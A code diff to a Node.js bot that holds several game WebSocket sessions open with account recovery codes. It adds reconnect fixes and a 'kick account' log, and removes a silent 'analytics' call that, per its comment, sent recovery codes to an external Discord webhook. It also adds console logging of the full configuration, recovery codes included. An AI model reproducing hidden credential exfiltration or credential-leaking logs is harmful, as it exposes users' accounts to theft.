@@ -89,7 +89,8 @@ let appState = {
     log1: [],
     log2: [],
     log3: [],
-    log4: []
+    log4: [],
+    log5: []  // Kick account logs
   },
   // Game state tracking (from bestscript.js)
   gameState: {
@@ -316,6 +317,12 @@ function createWebSocketConnectionInternal(wsNumber, recoveryCode, retryState) {
   };
   
   const reconnectCallback = (wsNum) => {
+    // Check if user intentionally disconnected
+    if (!appState.connected) {
+      addLog(wsNum, `⏰ User disconnected - skipping auto-reconnect`);
+      return;
+    }
+    
     // Auto-reconnect logic with optional code rotation
     const wsKey = `ws${wsNum}`;
     if (!appState.wsStatus[wsKey]) {
@@ -514,6 +521,11 @@ function createWebSocketConnectionInternal(wsNumber, recoveryCode, retryState) {
       addLog(wsNumber, `Auth message: ${text.substring(0, 50)}`);
     }
     
+    // Handle 860 (user info/status - Dad+ mode)
+    if (snippets[0] === "860") {
+      gameLogic.handle860Message(ws, snippets, text);
+    }
+    
     // Log all messages in headless mode for debugging
     if (HEADLESS_MODE) {
       console.log(`[WS${wsNumber}] ${text.substring(0, 150)}${text.length > 150 ? '...' : ''}`);
@@ -598,16 +610,7 @@ function connectAll() {
   // Initialize connection pool with current config
   initializeConnectionPool();
   
-  // Send analytics to Discord (optional - from bestscript.js line 217-219)
-  try {
-    // Create temporary game logic instance just for sendNick
-    if (appState.config.rc1 || appState.config.rc2 || appState.config.rc3 || appState.config.rc4 || appState.config.kickrc) {
-      const tempLogic = new FinalCompleteGameLogic(1, appState.config, addLog, null, null);
-      tempLogic.sendNick(appState.config).catch(() => {}); // Silently fail
-    }
-  } catch (error) {
-    // Analytics is optional - continue if it fails
-  }
+  // SECURITY: Discord analytics removed - no longer sending recovery codes to external webhook
   
   // Connect WS1 (uses pool to get rc1 or rcl1)
   if (appState.config.rc1 || appState.config.rcl1) {
@@ -645,6 +648,9 @@ function connectAll() {
 
 // Function to disconnect all
 function disconnectAll() {
+  // Set connected to false FIRST to prevent auto-reconnect
+  appState.connected = false;
+  
   Object.keys(appState.websockets).forEach(wsKey => {
     if (appState.websockets[wsKey]) {
       const ws = appState.websockets[wsKey];
@@ -677,7 +683,6 @@ function disconnectAll() {
       appState.wsStatus[wsKey] = false;
     }
   });
-  appState.connected = false;
 }
 
 // Express HTTP API Server
@@ -775,24 +780,34 @@ apiServer.post('/api/configure', (req, res) => {
   try {
     const config = req.body;
     
+    console.log('📥 Received configuration update:', JSON.stringify(config, null, 2));
+    
     // Update configuration
     Object.keys(config).forEach(key => {
       if (appState.config.hasOwnProperty(key)) {
+        const oldValue = appState.config[key];
         appState.config[key] = config[key];
+        if (oldValue !== config[key]) {
+          console.log(`  ✏️  ${key}: ${oldValue} → ${config[key]}`);
+        }
       }
     });
     
     // Reinitialize connection pool with new codes
     initializeConnectionPool();
     
-    console.log('Configuration updated:', config);
+    console.log('✅ Configuration updated successfully');
+    console.log('⚠️ NOTE: Active connections will use new settings immediately.');
+    console.log('⚠️ To use new recovery codes (rc1-4, kickrc), you must disconnect and reconnect.');
     
     res.json({
       success: true,
-      message: 'Configuration updated (connection pool reinitialized)',
-      config: appState.config
+      message: 'Configuration updated (active connections will use new settings immediately)',
+      config: appState.config,
+      note: 'To use new recovery codes, disconnect and reconnect'
     });
   } catch (error) {
+    console.error('❌ Configuration update error:', error);
     res.status(500).json({
       success: false,
       error: error.message
